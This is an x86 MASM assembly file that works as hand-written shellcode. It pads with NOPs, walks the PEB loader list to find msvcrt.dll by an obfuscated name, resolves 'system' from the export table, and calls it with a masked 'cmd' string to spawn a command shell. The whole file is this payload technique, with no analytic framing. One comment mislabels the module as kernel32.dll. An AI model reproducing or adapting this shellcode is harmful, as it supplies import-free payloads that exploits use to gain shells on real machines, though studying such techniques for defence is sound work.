.386
.model flat,stdcall
option casemap:none
include		windows.inc
include		user32.inc
includelib	user32.lib
include		kernel32.inc
includelib	kernel32.lib
			.code
;>>>>>>>>>>>>>>>>>>>>>>>
_WinMain		proc
			nop
			nop
			nop
			nop
			nop
			pushad
			sub esp,30h
			;mov dword ptr [esp+8],'Ayra'
			;mov dword ptr [esp+4],'rbiL'
			;mov dword ptr [esp],'daoL'
			push 07400720h 	;t r <<4
			push 06300760h	;c v <<4
			push 073006d0h	;s m <<4
		; find base addr of kernel32.dll
		ker_bas_add:
		assume fs:nothing 
			xor edx,edx
			mov ecx, fs:[edx + 30h] 	; ecx = address of PEB 
			mov ecx, [ecx + 0ch] 		; ecx = pointer to loader data 
			mov ecx, [ecx + 1ch] 		; ecx = first entry in initialisation order list 
		@@:	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) 
			mov eax, [ecx+20h]
			xor edx,edx
		@1:	mov ebx, [eax+edx]
			mov edi,dword ptr [esp+edx]
			shr edi,4
			cmp ebx,edi
			jnz @b
			add edx,4
			cmp edx,12
			jnz @1
			mov ebp, [ecx + 08h] 		; ebp = base address of msvcrt.dll 
			
			;push 'me'
			push 'tsys'
			;ebp->base address of XX.dll
		exp_tab: 
			mov eax, [ebp + 3ch]		; eax = start of PE header 
			mov ecx, [ebp + eax + 78h]	; ecx = relative offset of export table 
			add ecx, ebp 				; ecx = absolute addr of export table 
			mov ebx, [ecx + 20h] 		; ebx = relative offset of names table 
			add ebx, ebp 				; ebx = absolute addr of names table 
	
			xor edi, edi 				; edi will count through the functions 
			dec edi
		next_function_loop: 
			inc edi 					; increment function counter 
			mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name 
			add esi, ebp 				; esi = absolute addr of current function name 
			cdq 						; dl will hold hash (we know eax is small) 
			mov eax, dword ptr[esi]
			cmp eax,[esp]				
			jnz next_function_loop
		 
			mov ebx, [ecx + 24h] 		; ebx = relative offset of ordinals table 
			add ebx, ebp 				; ebx = absolute addr of ordinals table 
			mov di, [ebx + 2 * edi] 	; di = ordinal number of matched function 
			mov ebx, [ecx + 1ch] 		; ebx = relative offset of address table 
			add ebx, ebp 				; ebx = absolute addr of address table 
			add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the 
										; relative offset of matched function 
			;xor eax,eax
			push 'Admc'
			and dword ptr [esp],'8dmc'	;[esp]=='dmc'
			mov ecx,esp
			push ecx
			call ebp
			
		;eax->virtual address of the function 
			add esp,44h
			popad
			ret
			nop
			nop
			nop
			nop		
_WinMain 	endp
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
start:
	call	_WinMain
	invoke 	ExitProcess,0
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.
	end start